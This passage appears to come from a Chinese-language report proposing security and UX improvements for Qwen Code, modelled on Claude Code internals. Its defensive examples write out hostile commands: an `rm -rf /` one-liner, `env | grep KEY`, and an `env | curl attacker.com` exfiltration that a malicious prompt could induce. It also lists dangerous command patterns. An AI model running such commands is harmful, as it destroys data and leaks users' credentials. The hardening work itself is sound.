**Qwen Code 修改方向**：子进程继承完整环境含 API 密钥。改进方向：① 从 env 删除敏感变量（`DASHSCOPE_API_KEY` 等）；② 保留代理变量；③ 可配置清洗列表。

**实现成本评估**：
- 涉及文件：~2 个
- 新增代码：~80 行
- 开发周期：~1 天（1 人）
- 难点：敏感变量列表的完整性——遗漏任何一个都是安全漏洞

**改进前后对比**：
- **改进前**：shell 命令执行 `env | grep KEY` → 输出所有 API 密钥 → 凭证暴露
- **改进后**：子进程环境已清洗 → `env | grep KEY` 无结果 → 敏感凭证不可达

**意义**：子进程继承 API 密钥 = 任何 shell 命令能读取。
**缺失后果**：`env | grep KEY` 暴露所有密钥。
**改进收益**：环境清洗 = 子进程无法获取敏感凭证。

---

<a id="item-34"></a>

### 34. 工具输出密钥扫描（P2）

Agent 读取了项目中的 `.env` 文件，文件内容包含 AWS 密钥和 Stripe API key。随后 Agent 将这些内容写入了 `QWEN.md` 团队记忆文件——密钥泄漏到团队共享位置，所有团队成员都能看到。解决思路是工具结果用 50+ gitleaks 规则扫描——AWS/GitHub/Slack/PEM/Stripe 等模式，正则懒编译。检测到密钥时阻止写入共享记忆。

**Qwen Code 现状**：无工具输出密钥扫描——Agent 读取 `.env` 后可能将密钥写入 QWEN.md 等共享文件。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `services/teamMemorySync/secretScanner.ts` (295行) | 50+ gitleaks 规则 |
| `services/teamMemorySync/teamMemSecretGuard.ts` (44行) | 写入阻断 |

**参考实现**：[Multica](https://github.com/multica-ai/multica)（`server/pkg/redact/`）在 Agent 输出存入数据库和 WebSocket 广播前自动脱敏——覆盖 AWS Key、GitHub Token、PEM 私钥、SSH 密钥等模式，正则匹配 + 替换为 `[REDACTED ...]`。

**Qwen Code 修改方向**：无工具输出密钥扫描。改进方向：① 移植 gitleaks 规则（或参考 Multica 的 `redact` 包）；② 写入文件/记忆前扫描；③ 检测到密钥时警告 + 阻止写入共享位置。

**实现成本评估**：
- 涉及文件：~3 个
- 新增代码：~250 行
- 开发周期：~2 天（1 人）
- 难点：gitleaks 规则移植——需验证每条规则的准确性和误报率

**改进前后对比**：
- **改进前**：Agent 读取 `.env` → 将 AWS 密钥写入 QWEN.md → 密钥泄漏到团队共享文件
- **改进后**：Agent 读取 `.env` → 写入前密钥扫描 → 检测到 AWS 密钥 → 阻止写入 + 警告

**意义**：Agent 读 `.env` 后可能将密钥写入 QWEN.md。
**缺失后果**：密钥泄漏到团队文件。
**改进收益**：密钥扫描 = 阻止密钥写入共享位置。

---

<a id="item-35"></a>

### 35. privilege escalation防护（P2）

你启用了 auto/yolo 模式让 Agent 自动审批所有操作——但这意味着 Agent 可以执行 `python -c "import os; os.system('rm -rf /')"` 这样的任意代码。auto 模式的初衷是减少审批打断，但不应该允许任意代码执行和系统级操作。解决思路是进入自动模式时剥离危险权限规则——代码执行（python/node/ruby/perl）、shell（eval/exec/sudo）、网络（curl/wget/ssh）、云 CLI（aws/gcloud/kubectl）共 60+ 模式。

**Qwen Code 现状**：`yolo` 模式批准所有操作，无危险规则剥离——模型可执行任意脚本和系统命令。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `utils/permissions/dangerousPatterns.ts` (81行) | 60+ 危险模式自动剥离 |

**Qwen Code 修改方向**：`yolo` 模式批准所有操作，无危险规则剥离。改进方向：① 进入 auto/yolo 时剥离危险权限规则；② 被剥离的规则记录日志；③ `--dangerously-allow-all` 强制保留。

**实现成本评估**：
- 涉及文件：~2 个
- 新增代码：~100 行
- 开发周期：~1 天（1 人）
- 难点：危险模式列表的完整性——需覆盖所有已知的代码执行和系统操作方式

**改进前后对比**：
- **改进前**：yolo 模式 + `Bash(python -c "恶意代码")` → 自动批准 → 任意代码执行
- **改进后**：yolo 模式 → 60+ 危险模式被剥离 → `python` 执行仍需手动审批 → 安全边界保持

**意义**：auto 模式应减少审批，但不应允许任意代码执行。
**缺失后果**：yolo + `Bash(python *)` = 模型可执行任意脚本。
**改进收益**：危险规则剥离 = auto 仅批准安全操作。

---

---

<a id="item-36"></a>

### 36. Query TransitionReason 枚举（P2）

**问题**：Agent 的核心循环在每轮结束后决定"是否继续"。但"继续"可能有 6 种完全不同的原因——工具完成、token 截断、上下文压缩、传输重试、Hook 拦截、预算允许。如果不区分原因，日志不可读、测试不精确、调试困难。

**Claude Code 的解决方案**：每次跨轮时携带显式的 `TransitionReason`，区分 6 种转换原因。下一轮根据原因调整行为（如 COMPACTION 触发摘要注入，RETRY 触发退避延迟）。

**Claude Code 源码索引**：

| 文件 | 行号 | 转换原因 |
|------|------|---------|
| `query.ts` | L1092 | `collapse_drain_retry` — 上下文折叠后重试 |
| `query.ts` | L1162 | `reactive_compact_retry` — 响应式压缩后重试 |
| `query.ts` | L1175 | `prompt_too_long` — 上下文溢出 |
| `query.ts` | L1217 | `max_output_tokens_escalate` — 截断后升级 token 限制 |
| `query.ts` | L1302 | `stop_hook_blocking` — Stop Hook 拦截 |

**Qwen Code 现状**：`packages/core/src/core/client.ts` 循环中通过 if-else 隐式判断转换原因，无显式枚举类型。

**Qwen Code 修改方向**：① 新增 `TransitionReason` 枚举（6 种原因）；② 每次跨轮记录原因到 `QueryTransition` 对象；③ 日志输出包含转换原因。

**实现成本评估**：~50 行枚举 + 日志改动，~0.5 天。

**相关文章**：[查询状态转换模型](../tools/claude-code/20-query-transitions.md)

**意义**：核心循环的可观测性——知道"为什么继续"才能调试"为什么不停"。
**缺失后果**：循环不停时只能逐行读代码猜原因。
**改进收益**：日志直接显示 `transition=COMPACTION` → 立即知道是压缩触发的继续。

---

<a id="item-37"></a>

### 37. 工具并发安全分类（P2）✓ 已合并

**状态**：**已通过 [PR#2864](https://github.com/QwenLM/qwen-code/pull/2864) 实现**（2026-04-13 合并）。

**问题**：模型一次返回 5 个工具调用，哪些可以并行？此前 Qwen Code 仅按工具类型粗暴分类（Agent 工具并行，其他串行）。但 `read_file` 和 `grep` 也可以并行——它们不修改共享状态。

**Claude Code 的方案**：`StreamingToolExecutor`（530 行）对每个工具标记并发安全性，分区后批量并发执行。读工具并行，写工具串行，上下文修改器必须单独执行。

**Qwen Code 实现（PR#2864）**：

| 维度 | 实现方式 |
|---|---|
| **分类方法** | Kind-based（`Kind.Read` / `Kind.Search` / `Kind.Fetch` / `Agent` 安全；`Edit` / `Write` / `Kind.Think` 不安全） |
| **Batching 策略** | Consecutive batching——连续安全工具合并为一个并行批次，不安全工具打断批次 |
| **Shell 读写检测** | `isShellCommandReadOnly()` 白名单（~30 命令），含 git 子命令验证，未知命令 fail-closed 串行 |
| **行为变化** | Agent 工具从"无条件并发"改为"遵循 consecutive batching"，`[Edit, Agent]` 现在 Agent 会等 Edit 完成（更安全，保留模型意图顺序） |

**Claude Code 对比**：

| 能力 | Claude Code | Qwen Code（PR#2864 之后） |
|---|---|---|
| 只读工具并行 | ✓ | ✓ |
| Consecutive batch 分组 | ✓ | ✓ |
| Shell 只读检测 | regex + shell-quote + 每参数校验 | regex + 白名单 |

**相关 Roadmap**：[Roadmap#2516](https://github.com/QwenLM/qwen-code/issues/2516)

**相关文章**：[工具执行运行时](../tools/claude-code/21-tool-execution-runtime.md) | [工具并行深度对比](./tool-parallelism-deep-dive.md)

**收益验证**：5 个 read_file 串行 = 5 秒 → 并行 = 1 秒。代码探索阶段速度 3-5× 提升。

> 注：本条目与 [`item-7` 智能工具并行](./qwen-code-improvement-report-p0-p1-core.md#item-7) 属同一 PR 的两个侧面（item-7 聚焦"Kind-based batching 机制"，item-37 聚焦"per-tool concurrencySafe 属性"）。

---

<a id="item-38"></a>

### 38. 工具执行进度消息（P2）🟡 部分实现

**状态**：**[PR#3155](https://github.com/QwenLM/qwen-code/pull/3155)（2026-04-20 08:04 UTC 合并）实现了"时间 + 数量"视觉反馈，但未实现"语义化进度事件"**。这两类是不同的解决方案：

**PR#3155 覆盖的部分**（墙钟/字节反馈）：
- ✓ 3 秒阈值后显示 elapsed time（"工具慢"信号）
- ✓ Shell stats bar：`+N lines` / 字节数 / timeout
- ✓ OSC 9;4 终端标签进度指示（iTerm2/Ghostty/ConEmu/Windows Terminal + tmux/screen DCS passthrough）

**PR#3155 **未**覆盖的部分**（Claude Code 原设计的核心）：
- ✗ 语义化 progress events：Claude 在 `query/stopHooks.ts:204, 412` 处理 `type: 'progress' && toolUseID` 消息，tools 可在执行中 `yield { type: 'progress', toolUseCount, data }` 发射语义进度
- ✗ "Installing packages 42/100..." 类的**结构化进度解析**（如 npm install 的包计数、pip 的下载进度）
- ✗ Agent 工具 / Skill 工具的 `// Report progress for tool uses`（`tools/AgentTool/agentToolUtils.ts:384`、`tools/SkillTool/SkillTool.ts:239`）

**判断**：PR#3155 和 Claude Code 原设计**并非二选一**——墙钟反馈 + 语义进度可以共存。墙钟部分已落地，**语义进度仍是 gap**。若要完整覆盖，需要：
1. Tool execute 函数支持 `yield` progress events（core 改造）
2. Shell 工具 stdout 解析器（如 `/added \d+ packages/` regex for npm）
3. UI 层将 progress event 映射到工具行（例如"installing package 42/100..." 替代 elapsed time）

**同时影响（衍生效应）**：[item-47 ShellTimeDisplay](#item-47) 和 [item-46](#item-46) 也受 PR#3155 部分覆盖，具体差异见各自章节。

**问题**：`npm install` 执行 30 秒，用户看到的只是一个 Spinner 在转——不知道进度、不知道卡在哪。

**Claude Code 的解决方案**：长时间工具发射进度事件，UI 显示"正在安装依赖 42/100..."。

**Claude Code 源码索引**：

| 文件 | 行号 | 关键函数 |
|------|------|---------|
| `query/stopHooks.ts` | L204, L412 | `type === 'progress' && toolUseID` — 进度消息路由 |
| `tools/AgentTool/agentToolUtils.ts` | L384 | `toolUses: progress.toolUseCount` — Agent 工具进度 |
| `tools/SkillTool/SkillTool.ts` | L239 | `// Report progress for tool uses` — Skill 工具进度 |

**Qwen Code 现状**：工具执行期间仅显示通用 Spinner（"Responding..."）。

**Qwen Code 修改方向**：① 工具执行超过 3 秒时开始发射进度事件；② Shell 工具解析 stdout 提取进度信息（如 npm 的包数量）；③ UI 展示工具名 + 进度。

**实现成本评估**：~80 行，~1 天。

**改进前后对比**：
- **改进前**：`npm install` 30 秒 → 用户只看到 Spinner → 以为卡死
- **改进后**：`npm install` → "Installing packages 42/100..." → 用户知道在进行中

**意义**：用户信心——知道 Agent 在做什么 vs 怀疑 Agent 卡死。
**缺失后果**：用户在长工具执行时按 Ctrl+C 打断——因为不知道还在工作。
**改进收益**：进度消息 = 用户安心等待 = 更少的误打断。

---

<a id="item-39"></a>

### 39. 运行时任务模型（P2）

**问题**：Claude Code 区分两种"任务"——**work-graph task**（持久目标："重构 auth 模块"，有依赖关系）和 **runtime task**（执行槽："后台 npm install 进程 PID 12345"）。如果把两者混在一起，任务面板会混乱——用户看到"重构 auth"和"PID 12345"并列，分不清哪个是目标哪个是执行。

**Claude Code 的解决方案**：`TaskRecord`（work-graph）和 `RuntimeTaskState`（execution slot）分离。

**Claude Code 源码索引**：

| 文件 | 行号 | 关键函数 |
|------|------|---------|
| `utils/tasks.ts` | 862 行 | `TaskStatusSchema`、`blockedBy` 依赖、CRUD 操作 |
| `utils/tasks.ts` | L71 | `TaskStatusSchema` — pending/in_progress/completed/cancelled/blocked |
| `utils/tasks.ts` | L85 | `blockedBy: z.array(z.string())` — 依赖关系 |

**Qwen Code 现状**：仅有 `TodoWriteTool`（平面清单），无 work-graph task 也无 runtime task。

**Qwen Code 修改方向**：① 如果实现 trackerTools（改进报告已有），采用 work-graph task 模型；② 后台 Shell 进程采用 runtime task 模型；③ 两者分开展示。

**实现成本评估**：需结合 trackerTools 和后台 Shell 管理一起实现。

**相关文章**：[参考速查](../tools/claude-code/19-reference.md)

**意义**：概念分离 = 代码清晰 + UI 清晰——用户和开发者都不困惑。
**缺失后果**：任务和进程混在一个列表——用户不知道哪些可以"完成"哪些需要"终止"。
**改进收益**：两种任务分离 = 目标追踪 + 执行监控各归其位。

---

<a id="item-40"></a>

### 40. 后台通知 drain-before-call（P2）

**问题**：后台任务（如 `npm install`）完成时，结果被放入通知队列。但如果主循环不在 LLM 调用前排空队列，模型在下一轮推理时看不到后台结果——以为任务还在运行。

**Claude Code 的解决方案**：每次 LLM 调用前，先排空后台通知队列注入对话上下文。

**Claude Code 源码索引**：

| 文件 | 行号 | 关键函数 |
|------|------|---------|
| `query.ts` | L1067 | `// drain first (cheap, keeps granular context)` — 排空注释 |
| `query.ts` | L609 | `// context-collapse: its recoverFromOverflow drains` — 恢复排空 |
| `utils/plugins/pluginAutoupdate.ts` | L42-59 | `pendingNotification` 队列 + `callback(pendingNotification)` 排空 |

**Qwen Code 现状**：有后台 Shell 能力（`is_background` 参数），但无通知排空机制——后台任务完成后模型不知道。

**Qwen Code 修改方向**：① 创建 `NotificationQueue`（线程安全）；② 后台任务完成时入队；③ `queryModel()` 前调用 `drain()` 将结果注入 messages。

**实现成本评估**：~50 行，~0.5 天。

**意义**：后台任务的核心价值在于结果能被模型利用——否则不如前台执行。
**缺失后果**：后台 npm install 完成了，但模型还在说"等待安装完成..."。
**改进收益**：drain-before-call = 模型始终看到最新后台状态。

---

<a id="item-41"></a>

### 41. 压缩后身份重注入（P2）

**问题**：长会话经过上下文压缩后，messages 数组可能只剩 2-3 条（压缩摘要 + 最新消息）。此时多 Agent 场景下的 Teammate 会"忘记自己是谁"——不知道自己的名字、角色、团队。

**Claude Code 的解决方案**：当 `messages.length <= 3` 时，在消息开头注入 identity block（Agent 名称 + 角色 + 团队配置）。

**Claude Code 源码索引**：

| 文件 | 行号 | 关键函数 |
|------|------|---------|
| `tools/shared/spawnMultiAgent.ts` | L399-403 | `// Build teammate identity CLI args` — 身份参数构建 |
| `tools/shared/spawnMultiAgent.ts` | L606-610 | tmux 后端身份参数 |
| `tools/shared/spawnMultiAgent.ts` | L1012 | `// In-process teammates receive the prompt directly` — InProcess 身份 |

**Qwen Code 现状**：无身份重注入。压缩后 Subagent 可能丢失上下文身份。

**Qwen Code 修改方向**：① 压缩后检查 messages 长度；② 如果 <= 3 条，注入 `{name, role, team}` 身份消息；③ 仅对 Subagent/Teammate 触发（主 Agent 不需要）。

**实现成本评估**：~20 行，~0.5 天。

**意义**：多 Agent 场景下的身份连续性——Agent 不知道自己是谁就无法正确协作。
**缺失后果**：Teammate "Alice" 压缩后变成通用 Agent → 不知道该向谁汇报 → 协作中断。
**改进收益**：身份重注入 = 压缩后 Agent 仍然知道自己的角色和团队。

---

<a id="item-42"></a>

### 42. 子进程 PID 命名空间沙箱 + 脚本次数限制（P2）

**来源**：Claude Code v2.1.98 新增 `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB` + `CLAUDE_CODE_SCRIPT_CAPS`。

**问题**：Qwen Code 的 Shell 工具执行子进程时**不隔离**——子进程能看到父进程的所有环境变量（可能含有 API Key、认证信息）、可无限次启动脚本（可被恶意 hook 滥用）、在 Linux 上缺少 PID 命名空间隔离。

**Claude Code v2.1.98 的方案**：

1. **PID 命名空间隔离（Linux）**：当 `CLAUDE_CODE_SUBPROCESS_ENV_SCRUB` 被设置时，子进程在**独立 PID 命名空间**运行——看不到宿主机其他进程，`ps aux` 只显示自己。
2. **环境变量清洗**：scrub 掉敏感变量（API key、OAuth token 等）后才传给子进程。
3. **脚本调用次数限制**：`CLAUDE_CODE_SCRIPT_CAPS` 限制每个 session 能启动多少次脚本——防止恶意 prompt 导致无限 fork。

源码索引（Claude Code）：
- `utils/sandbox/` — PID 命名空间初始化
- `utils/env.ts` — `scrubEnvForSubprocess()`
- `utils/scriptCaps.ts` — per-session 计数

**Qwen Code 现状**：
- 已有 `sandbox.ts`（984 行，macOS Seatbelt + Docker/Podman），但 Linux 缺少命名空间隔离（只有容器化）
- 没有子进程环境变量清洗
- 没有脚本次数上限

**Qwen Code 修改方向**：
1. Linux 子进程用 `unshare(CLONE_NEWPID)` 或 `bwrap --unshare-pid` 启动
2. `scrubEnvForSubprocess()`：白名单或黑名单过滤敏感环境变量
3. `ScriptCapsService`：每 session 维护计数器，超过阈值拒绝新调用 + warning

**实现成本评估**：
- 涉及文件：~4 个
- 新增代码：~300 行
- 开发周期：~3 天
- 难点：PID 命名空间在非 root 环境的权限处理、env scrub 的白名单合理性

**意义**：Shell 工具是 agent 的主要攻击面——子进程能看到什么环境变量、能启动多少次进程都是关键安全边界。
**缺失后果**：恶意 prompt 可以诱导 Agent 执行 `env | curl attacker.com` 外传 API Key；可以通过无限 fork 耗尽系统资源。
**改进收益**：PID namespace + env scrub + script caps = shell 子进程只能看到必要信息，调用次数受限。

---

<a id="item-43"></a>

### 43. 会话 Recap（返回时上下文摘要）（P2）

**来源**：Claude Code v2.1.108 + v2.1.110。

**问题**：用户离开几天再打开一个旧会话，往往需要滚动几页才能想起**"我上次在做什么"**。当前 Qwen Code `/resume` 仅重新加载消息，不主动给用户一个"回忆"。

**Claude Code 版本时间线**：

| 版本 | 变化 |
|---|---|
| **v2.1.108** | **首次引入**：`/recap` slash 命令 + 自动展示。可在 `/config` 配置；`CLAUDE_CODE_ENABLE_AWAY_SUMMARY` env var 强制开启（遥测禁用时） |
| **v2.1.110** | 1) **Bedrock / Vertex / Foundry / `DISABLE_TELEMETRY` 用户也默认启用**（用 `CLAUDE_CODE_ENABLE_AWAY_SUMMARY=0` 退出）<br>2) 修复 recap 在 focus mode 下不显示的问题 |

**两种触发方式**：

| 类型 | 条件 | 实现 |
|---|---|---|
| **自动** | 终端失焦 ≥ 5 分钟（DECSET 1004 焦点协议） + 当前无 turn + 上次 user turn 后还没出现过 recap | `hooks/useAwaySummary.ts`，5 min 计时 + 焦点回归时 abort |
| **手动** | `/recap` 命令 | 直接调用同一 `generateAwaySummary()` |

**UI 表现**（用户实际看到的"输入框上方一行 dim color 信息"）：

源码 `components/messages/SystemTextMessage.tsx:69-85`：

```tsx
if (message.subtype === "away_summary") {
  return <Box minWidth={2}>
    <Text dimColor={true}>{REFERENCE_MARK}</Text>
    <Text dimColor={true}>{message.content}</Text>
  </Box>
}
```

- ✅ **dimColor=true**（灰暗色）—— 视觉上明确区分于 Agent 正常回复
- ✅ **REFERENCE_MARK** 引用符号前缀
- ✅ 1-3 句话精简内容

**核心实现**（源码 `services/awaySummary.ts`，74 行）：

```typescript
const RECENT_MESSAGE_WINDOW = 30  // 最近 30 条消息

function buildAwaySummaryPrompt(memory: string | null): string {
  return `${memoryBlock}The user stepped away and is coming back.
Write exactly 1-3 short sentences. Start by stating the high-level task
— what they are building or debugging, not implementation details.
Next: the concrete next step.
Skip status reports and commit recaps.`
}
```

**关键设计点**：

| 要素 | 设计 | 理由 |
|---|---|---|
| **模型** | `getSmallFastModel()` —— Haiku | 摘要任务无需 Frontier 模型 |
| **窗口** | 最近 30 条消息（≈15 个 user-assistant 对） | 防止"prompt too long" |
| **Memory 集成** | 注入 SessionMemory 作为 broader context | 让摘要包含项目背景知识 |
| **Tools** | `tools: []`（**禁用工具调用**） | 摘要是纯文本生成 |
| **Thinking** | `disabled` | 简单任务不需要扩展推理 |
| **Cache** | `skipCacheWrite: true` | 一次性查询不污染 prompt cache |
| **错误处理** | 静默失败（`return null`） | 即使 API 故障也不打断主流程 |

**Prompt 工程要点**（明确禁止 3 类 LLM 倾向）：
- ❌ "implementation details"（不要罗列做了什么）
- ❌ "status reports"（不要"已完成 X / 进行中 Y"流水账）
- ❌ "commit recaps"（不要 git log 复述）
- ✅ **要求**："**high-level task**" → "**concrete next step**"

**Qwen Code 现状**：`/resume` 仅加载消息，无 recap 机制。PROJECT_SUMMARY.md 提供了类似能力但是人工维护。

**Qwen Code 修改方向**：
1. **新建 `services/sessionRecap.ts`**：输入最近 30 条消息 + 可选 memory block，调用 fastModel（[PR#3120 已合并](https://github.com/QwenLM/qwen-code/pull/3120) 已有 fastModel 选择器）生成 1-3 句摘要
2. **新建 `hooks/useAwaySummary.ts`** 等价物：5 min blur 计时 + DECSET 1004 焦点协议监听 + 焦点回归 abort
3. **`/resume` 切换会话后自动显示 recap**（默认开启，可配置 `showSessionRecap: false`）
4. **新建 `/recap` 命令手动触发**
5. **UI**：dim color + 引用符号前缀，区别于 Agent 回复（参考 `components/messages/SystemTextMessage.tsx`）
6. Recap prompt 模板：高层任务 → 下一步，**禁止 status reports / commit recaps**

**实现成本评估**：
- 涉及文件：~5 个（`services/sessionRecap.ts` + `hooks/useAwaySummary.ts` + `commands/recap.ts` + `SystemTextMessage` UI 扩展 + settings）
- 新增代码：~250 行
- 开发周期：~3 天
- 前置：[PR#3120](https://github.com/QwenLM/qwen-code/pull/3120) fastModel 配置（已合并）

**意义**：返回旧会话的体验直接影响**长项目的用户粘性**——想不起上次做什么就容易放弃。
**缺失后果**：用户打开长会话 → 滚动几页回忆 → 体验差 → 倾向于开新会话丢弃旧上下文。
**改进收益**：recap = 3 秒钟回忆上次做到哪里。

---

<a id="item-44"></a>

### 44. 瞬态消息单行容器 + 离屏历史冻结（P2）

> **配套阅读**：[任务显示高度控制 Deep-Dive](./task-display-height-deep-dive.md) —— 本 item 第 1.1/1.2 节的完整分析。

**来源**：Claude Code 的 4 条高度控制机制之 2 条。

**问题**：长任务执行时，Qwen Code 屏幕容易被"爆"——工具进度消息可能占多行，历史消息里的 spinner 还在动导致每个 tick 整个终端 reset。Claude Code 通过**瞬态消息统一高度容器**（`MessageResponse`）+ **离屏 React 子树冻结**（`OffscreenFreeze`）两条机制压缩活跃区并消除历史区重排。

**Claude Code 的解决方案（两条配合）**：

#### (A) `MessageResponse` 单行容器

所有瞬态消息（工具进度 / Waiting / Running hook / Done / (No output) / 图像检测消息）共享一个 `<Box height={1} overflowY="hidden">` 容器。外部可传 `height` 扩展，但默认 1。`overflowY="hidden"` 是 clip 而非 scroll——看不到就是看不到。

```tsx
// components/MessageResponse.tsx:37
<Box flexDirection="row" height={height} overflowY="hidden">
  {prefixIcon}{mainText}
</Box>
```

#### (B) `OffscreenFreeze` 离屏冻结

滚出视口的历史消息用 `useRef` 缓存 React element 引用，reconciler 看到相同引用直接 bail out → 子树 **0 diff**。

```tsx
// components/OffscreenFreeze.tsx:23-42
export function OffscreenFreeze({ children }): React.ReactNode {
  'use no memo'  // React Compiler: 手动缓存是整个冻结机制，memo 会破坏它
  const [ref, { isVisible }] = useTerminalViewport()
  const cached = useRef(children)
  if (isVisible || inVirtualList) cached.current = children
  return <Box ref={ref}>{cached.current}</Box>
}
```

**为什么需要冻结**（源码注释原话）：

> Any content change above the viewport forces `log-update.ts` into a **full terminal reset**. For content that updates on a timer — spinners, elapsed counters — this produces a reset per tick.

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `components/MessageResponse.tsx:37` | `<Box height={height} overflowY="hidden">` 统一容器 |
| `components/OffscreenFreeze.tsx:23-42` | `useRef` 引用缓存 + `useTerminalViewport` 可见性检测 |
| `components/messages/HookProgressMessage.tsx:66-113` | Hook 进度消息使用 MessageResponse |
| `tools/BashTool/BashToolResultMessage.tsx:103-189` | 图像检测/(No output) 均 `height={1}` |
| `ink/hooks/use-terminal-viewport.ts` | 可见性检测 hook 实现 |

**Qwen Code 现状**：消息组件分散，进度/工具结果没有统一高度容器；所有消息每帧参与 reconcile，历史区 spinner 动画拖累全屏重排。

**Qwen Code 修改方向**：
1. **新建 `packages/cli/src/ui/components/MessageResponse.tsx`**：复刻 `<Box flexDirection="row" height={height} overflowY="hidden">` 抽象（~20 行）
2. 改造 `ToolGroupMessage` / 工具进度组件 / Waiting 组件用 `<MessageResponse>` 包裹
3. **新建 `packages/cli/src/ui/hooks/useTerminalViewport.ts`**：基于 `measureElement` + 全局 scroll 位置检测可见性（难点）
4. **新建 `packages/cli/src/ui/components/OffscreenFreeze.tsx`**：复刻 useRef 冻结模式（~20 行），wrap 所有历史消息

**实现成本评估**：
- 涉及文件：~6 个
- 新增代码：~200 行（其中 viewport hook 占 ~100 行）
- 开发周期：~3-4 天
- 难点：Ink 无内建 `useTerminalViewport`，需要自定义基于 scroll 位置和元素 offset 的检测

**改进前后对比**：
- **改进前**：10 条历史工具调用 × 每条 spinner 动画 → 每秒 >30 次终端 reset → 交互卡顿
- **改进后**：离屏历史 0 CPU / 活跃区固定 1 行/工具 → 屏幕始终紧凑，交互流畅

**意义**：屏幕紧凑 + 历史零成本是 "感觉丝滑" 的核心来源。
**缺失后果**：Qwen Code 长任务执行时屏幕容易失控，历史 spinner 动画拖累全局性能。
**改进收益**：MessageResponse 单行压缩活跃区 + OffscreenFreeze 消除历史 reset = 90% 的"屏幕爆"感知问题解决。

---

<a id="item-45"></a>

### 45. 三级输出截断（Bash 30K / 单工具 50K / 单消息 200K）（P2）

> **配套阅读**：[任务显示高度控制 Deep-Dive](./task-display-height-deep-dive.md) —— 本 item 第 1.4 节的完整分析。

**来源**：Claude Code 的 `constants/toolLimits.ts` + `utils/shell/outputLimits.ts`。

**问题**：Qwen Code 没有统一的工具输出字符截断策略——`cat large.log` 可能输出几 MB、`find /` 可能上万行、10 个并行 `read_file` 可能累计吃掉 500K context。大输出直接塞进 API 上下文会：(a) 爆 token 预算、(b) 后续交互变慢、(c) 屏幕被刷爆。

**Claude Code 的解决方案（三级设防）**：

| 层级 | 常量 | 值 | 作用 |
|-----|-----|-----|-----|
| 1 | `BASH_MAX_OUTPUT_DEFAULT` | **30,000 字符** | Bash 命令默认输出上限（~300-500 行） |
| 1' | `BASH_MAX_OUTPUT_UPPER_LIMIT` | **150,000 字符** | env var `BASH_MAX_OUTPUT_LENGTH` 可在 [30K, 150K] 调整 |
| 2 | `DEFAULT_MAX_RESULT_SIZE_CHARS` | **50,000 字符** | 单工具结果超限持久化到磁盘，model 收到文件路径 preview |
| 2' | `MAX_TOOL_RESULT_TOKENS` | **100,000 tokens** (~400KB) | 单工具 token 硬上限（防御性） |
| 3 | `MAX_TOOL_RESULTS_PER_MESSAGE_CHARS` | **200,000 字符** | 单 user 消息所有工具结果总预算——按大小排序持久化最大的 |
| 4 | `TOOL_SUMMARY_MAX_LENGTH` | **50 字符** | 折叠视图的工具 summary 截断长度 |

**层 3 的精妙之处（源码注释原话）**：

> This prevents **N parallel tools** from each hitting the per-tool max and collectively producing e.g. 10 × 40K = 400K in one turn's user message.

**层 1 的 env var 调整机制**：

```typescript
// utils/shell/outputLimits.ts:6-14
export function getMaxOutputLength(): number {
  const result = validateBoundedIntEnvVar(
    'BASH_MAX_OUTPUT_LENGTH',
    process.env.BASH_MAX_OUTPUT_LENGTH,
    BASH_MAX_OUTPUT_DEFAULT,      // 30_000
    BASH_MAX_OUTPUT_UPPER_LIMIT,  // 150_000
  )
  return result.effective  // 超出自动 clamp
}
```

**截断后的 UX**：保留前 30K 字符 + 显示 `[N lines truncated]`，完整内容持久化到磁盘供后续检索。

**GrowthBook 运行时调整**：`tengu_hawthorn_window` flag 调整 per-message 预算（`toolResultStorage.ts:getPerMessageBudgetLimit()`）。

**Claude Code 源码索引**：

| 文件 | 关键函数/常量 |
|------|-------------|
| `utils/shell/outputLimits.ts:3-14` | `BASH_MAX_OUTPUT_DEFAULT`、`BASH_MAX_OUTPUT_UPPER_LIMIT`、`getMaxOutputLength()` |
| `constants/toolLimits.ts:13-49` | 6 个常量定义 + 注释说明设计意图 |
| `services/toolResultStorage.ts` | 持久化到磁盘 + path preview 生成（实现细节）|
| `tools/BashTool/utils.ts:147-157` | 截断逻辑 + `[N lines truncated]` 提示 |

**Qwen Code 现状**：`grep -rn "BASH_MAX_OUTPUT\|MAX_RESULT_SIZE\|overflowY" packages/` 未命中。ShellTool 可能直接把全部输出塞进上下文。

**Qwen Code 修改方向**：
1. **P0：Bash 输出层**——新建 `packages/cli/src/utils/shell/outputLimits.ts`，实现 `getMaxOutputLength()` + `truncateOutput()`，env var `QWEN_BASH_MAX_OUTPUT_LENGTH` 在 [1K, 150K] 可调。在 ShellExecutionService 调用 `truncateOutput()`。
2. **P1：单工具结果层**——新建 `packages/core/src/constants/toolLimits.ts` 定义 50K 上限；新建 `toolResultStorage.ts` 超限时持久化到 `.qwen/tool-results/<hash>.txt` 并返回 path preview（前 2K 字符 + 文件路径）。
3. **P2：消息层 200K 预算**——在消息组装阶段统计单 user 消息所有工具结果总字节，超限时按大小排序持久化最大的。

**实现成本评估**：
- P0：~20 行 + 测试 = **0.5 天**
- P1：~150 行（含持久化 I/O）= 2-3 天
- P2：~80 行 = 1 天
- 总计：~4 天，可分 3 个独立 PR 提交
- 难点：P1 需要磁盘 I/O + hash 生成 + 后续 read 流程适配（Agent 需要知道可以 `read_file` 拉回完整内容）

**改进前后对比**：
- **改进前**：`cat production.log` 1.2MB → 直接塞进 context → 后续 token 预算告急 → 对话只能 3 轮就压缩
- **改进后**：截断到 30K + `[18750 lines truncated]` 提示 → context 保护 → Agent 若需要可 `read_file` 分页拉回

**意义**：工具输出不设防是 context 爆炸的头号元凶。
**缺失后果**：大日志 / 大 find 结果直接爆 context，单次交互无法完成。
**改进收益**：三级设防保证单次交互 token 预算可控；env var 允许用户按需调整。

**验证方法**：`grep -rn "BASH_MAX_OUTPUT\|truncateOutput\|MAX_TOOL_RESULTS_PER_MESSAGE" packages/` 看命中情况；改进后应 ≥ 3 处命中。

---

<a id="item-46"></a>

### 46. Bash 执行中 "5 行窗口 + `+N lines` 计数"（P2）🟡 拆分实现中（PR#3155 ✓ + PR#3508 OPEN）

> **配套阅读**：[Bash 任务展示 Deep-Dive](./bash-task-display-deep-dive.md) 第 2.1 节。

**状态**：已拆分为两个 PR，各自覆盖一半：
- **[PR#3155](https://github.com/QwenLM/qwen-code/pull/3155) ✓（2026-04-20 合并）**：实现 `+N lines` 计数部分（`ShellStatsBar` 组件：`+N lines` + UTF-8 字节数 + explicit timeout）
